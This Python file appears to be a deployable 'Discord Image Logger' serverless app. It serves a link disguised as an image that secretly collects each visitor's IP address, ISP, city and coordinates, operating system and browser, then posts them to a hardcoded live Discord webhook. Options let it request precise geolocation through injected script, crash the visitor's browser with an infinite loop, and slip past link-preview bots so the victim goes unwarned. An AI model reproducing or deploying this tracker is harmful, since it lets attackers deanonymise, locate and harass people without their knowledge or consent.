import base64
import traceback
import requests
import httpagentparser
from urllib import parse

# Debug: Confirm script starts
print("Script started")

# Metadata
__app__ = "Discord Image Logger"
__description__ = "A serverless application to log IPs via Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

# Configuration
config = {
    "webhook": "https://discord.com/api/webhooks/1388600720617377903/J60zZzLcngRQDM1THrAzKy-E3Axt5m9L2J4gPWb6oKC-LMXIzWmpKW0nuCRvPCaVBwr_",  # Replace with your Discord webhook URL
    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTPthG5agC_1cdiCsb7MI61Xp3ZxemhHawWKw&s",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,  # 0: No VPN check, 1: No ping on VPN, 2: Skip VPN
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,  # 0: No bot check, 1: No ping on possible bot, 2-4: Stricter bot checks
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

# Blacklisted IP prefixes
blacklistedIPs = ("27", "104", "143", "164")

# Loading image binary
binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

# Check if request is from a bot
def botCheck(ip, useragent):
    print(f"botCheck: IP={ip}, UserAgent={useragent}")  # Debug
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

# Report errors to Discord webhook
def reportError(error):
    print(f"Reporting error: {error}")  # Debug
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }],
        })
    except Exception as e:
        print(f"Failed to send error to webhook: {e}")

# Create and send IP report to Discord
def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    print(f"makeReport: IP={ip}, Endpoint={endpoint}")  # Debug
    if any(ip.startswith(prefix) for prefix in blacklistedIPs):
        print(f"IP {ip} is blacklisted")  # Debug
        return

    bot = botCheck(ip, useragent)
    if bot and config["linkAlerts"]:
        print(f"Sending link alert for {bot}")  # Debug
        try:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        except Exception as e:
            print(f"Failed to send link alert: {e}")
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        print(f"IP-API response: {info}")  # Debug
    except Exception as e:
        print(f"IP-API request failed: {e}")
        return

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            print("VPN detected, skipping (vpnCheck=2)")  # Debug
            return
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] == 4 and not info.get("proxy"):
            print("Bot detected, skipping (antiBot=4)")  # Debug
            return
        if config["antiBot"] == 3:
            print("Bot detected, skipping (antiBot=3)")  # Debug
            return
        if config["antiBot"] == 2 and not info.get("proxy"):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    coords_str = f"{str(info.get('lat', 'Unknown'))}, {str(info.get('lon', 'Unknown'))}" if not coords else coords.replace(',', ', ')
    coords_label = "Approximate" if not coords else f"Precise, [Google Maps](https://www.google.com/maps/search/{coords.replace(',', '+')})"
    description = (
        f"**A User Opened the Original Image!**\n\n"
        f"**Endpoint:** `{endpoint}`\n\n"
        f"**IP Info:**\n"
        f"> **IP:** `{ip if ip else 'Unknown'}`\n"
        f"> **Provider:** `{info.get('isp', 'Unknown')}`\n"
        f"> **ASN:** `{info.get('as', 'Unknown')}`\n"
        f"> **Country:** `{info.get('country', 'Unknown')}`\n"
        f"> **Region:** `{info.get('regionName', 'Unknown')}`\n"
        f"> **City:** `{info.get('city', 'Unknown')}`\n"
        f"> **Coords:** `{coords_str}` ({coords_label})\n"
        f"> **Timezone:** `{info.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'} ({info.get('timezone', 'Unknown/Unknown').split('/')[0]})\n"
        f"> **Mobile:** `{info.get('mobile', 'Unknown')}`\n"
        f"> **VPN:** `{info.get('proxy', 'False')}`\n"
        f"> **Bot:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`\n\n"
        f"**PC Info:**\n"
        f"> **OS:** `{os}`\n"
        f"> **Browser:** `{browser}`\n\n"
        f"**User Agent:**\n"
        f"```\n{useragent}\n```"
    )

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": description,
        }],
    }
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    try:
        requests.post(config["webhook"], json=embed)
        print("Successfully sent report to webhook")  # Debug
    except Exception as e:
        print(f"Failed to send report to webhook: {e}")
    return info

# Vercel serverless function
def handler(environ, start_response):
    print(f"Handling request from {environ.get('HTTP_X_FORWARDED_FOR', 'unknown')}")  # Debug
    try:
        # Parse request path and query
        path = environ.get('PATH_INFO', '')
        query = environ.get('QUERY_STRING', '')
        s = f"{path}?{query}" if query else path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

        # Determine image URL
        if config["imageArgument"]:
            if dic.get("url") or dic.get("id"):
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
            else:
                url = config["image"]
        else:
            url = config["image"]

        # Prepare response data
        data = f"""<style>body {{
    margin: 0;
    padding: 0;
}}
div.img {{
    background-image: url('{url}');
    background-position: center center;
    background-repeat: no-repeat;
    background-size: contain;
    width: 100vw;
    height: 100vh;
}}</style><div class="img"></div>""".encode()

        # Check blacklisted IPs
        ip = environ.get('HTTP_X_FORWARDED_FOR', '')
        if any(ip.startswith(prefix) for prefix in blacklistedIPs):
            print(f"Blacklisted IP: {ip}")  # Debug
            start_response('204 No Content', [])
            return [b'']

        # Check for bots
        useragent = environ.get('HTTP_USER_AGENT', '')
        if botCheck(ip, useragent):
            if config["buggedImage"]:
                start_response('200 OK', [('Content-Type', 'image/jpeg')])
                makeReport(ip, endpoint=s.split("?")[0], url=url)
                return [binaries["loading"]]
            else:
                start_response('302 Found', [('Location', url)])
                makeReport(ip, endpoint=s.split("?")[0], url=url)
                return [b'']
        else:
            # Handle geolocation
            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(ip, useragent, location, s.split("?")[0], url=url)
            else:
                result = makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)

            # Prepare message
            message = config["message"]["message"]
            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", ip or "Unknown")
                message = message.replace("{isp}", result.get("isp", "Unknown"))
                message = message.replace("{asn}", result.get("as", "Unknown"))
                message = message.replace("{country}", result.get("country", "Unknown"))
                message = message.replace("{region}", result.get("regionName", "Unknown"))
                message = message.replace("{city}", result.get("city", "Unknown"))
                message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                message = message.replace("{long}", str(result.get("lon", "Unknown")))
                message = message.replace("{timezone}", f"{result.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if result.get('timezone') else 'Unknown'} ({result.get('timezone', 'Unknown/Unknown').split('/')[0]})")
                message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                message = message.replace("{vpn}", str(result.get("proxy", "False")))
                message = message.replace("{bot}", str(result.get("hosting", "False") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
                message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])

            datatype = 'text/html'
            if config["message"]["doMessage"]:
                data = message.encode()
            if config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

            if config["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
            start_response('200 OK', [('Content-Type', datatype)])
            return [data]
    except Exception as e:
        print(f"Error in handler: {e}")  # Debug
        reportError(traceback.format_exc())
        start_response('500 Internal Server Error', [('Content-Type', 'text/html')])
        return [b'500 - Internal Server Error <br>Please check the console and Discord webhook for details.']

# Vercel entry point
def main(request, response):
    return handler(request.environ, response)
